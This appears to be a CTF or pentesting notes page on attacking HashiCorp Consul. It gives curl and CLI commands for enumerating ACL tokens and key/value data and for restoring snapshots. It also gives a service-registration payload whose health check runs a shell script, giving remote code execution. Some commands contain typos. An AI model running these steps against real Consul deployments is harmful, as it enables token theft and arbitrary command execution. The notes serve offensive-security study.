# Consul

Service Networking Solution

![](https://pwnsec-notes.gitbook.io/ctf-notes/~gitbook/image?url=https%3A%2F%2F1504879363-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F40QKoxlr9Mj1ke1fMHsL%252Fuploads%252FVloih62coV5EdDdNt8nM%252Fimage.png%3Falt%3Dmedia%26token%3D23b22890-173f-4bbe-ad83-a33d1c6fe858&width=768&dpr=4&quality=100&sign=8b992fda&sv=2)

## Overview

HashiCorp Consul is a service networking solution that enables teams to manage secure network connectivity between services and across on-prem and multi-cloud environments and runtimes. Consul offers service discovery, service mesh, traffic management, and automated updates to network infrastructure device. You can use these features individually or together in a single Consul deployment.

## How does it work

Consul provides a***control plane*** that enables you to register, query, and secure services deployed across your network. The control plane is the part of the network infrastructure that maintains a central registry to track services and their respective IP addresses. It is a distributed system that runs on clusters of nodes, such as physical servers, cloud instances, virtual machines, or containers.

Consul interacts with the *data plane* through proxies. The data plane is the part of the network infrastructure that processes data requests.

## Enumerating ACLS

```
curl --header "X-Consul-Token: <TOKEN> --request GET http://127.0.0.1:8500/v1/acl/roles
```

### Listing tokens

Requires an `acl:write` to view `SecretId` otherwise if `acl:read` is set; `SecretId` will be hidden.

```
curl --header "X-Consul-Token: <TOKEN> --request GET http://127.0.0.1:8500/v1/acl/tokens
```

## Enumerating Keys

The `/kv` endpoints access Consul's simple key/value store, useful for storing service configuration or other metadata.

It is important to note that each datacenter has its own KV store, and there is no built-in replication between datacenters.

```
# Listing Keys
consul kv get -token <TOKEN> -keys
# Listing detailed data from all keys
consul kv get -token <TOKEN> -recurse -detailed <KEY>
```

## Restoring Snapshots

```
consul snapshot restore -token <TOKEN> backup.snap
```

## Remote Code Execution

We can achieve Remote code execution if we have the privileges to register a new service.

* **Payload.json**

```
{
  "ID": "meow",
  "Name": "meow",
  "Tags": ["primary", "v1"],
  "Address": "127.0.0.1",
  "Port": 8000,
  "Meta": {
    "redis_version": "4.0"
  },
  "EnableTagOverride": false,
  "Check": {
    "DeregisterCriticalServiceAfter": "90m",
    "Args": ["/bin/bash","/tmp/abuqasem.sh"],
    "Interval": "10s",
    "Timeout": "1h"
  },
  "Weights": {
    "Passing": 10,
    "Warning": 1
  }
}
```

* **Now Trigger**

```
 curl \
    ---header "X-Consul-Token: <TOKEN>
    --request PUT \
    --data @payload.json \
    http://127.0.0.1:8500/v1/agent/service/register?replace-existing-checks=true
```

**Reference:** [**https://developer.hashicorp.com/consul/api-docs/agent/service#register-servic**](https://developer.hashicorp.com/consul/api-docs/agent/service#register-service)

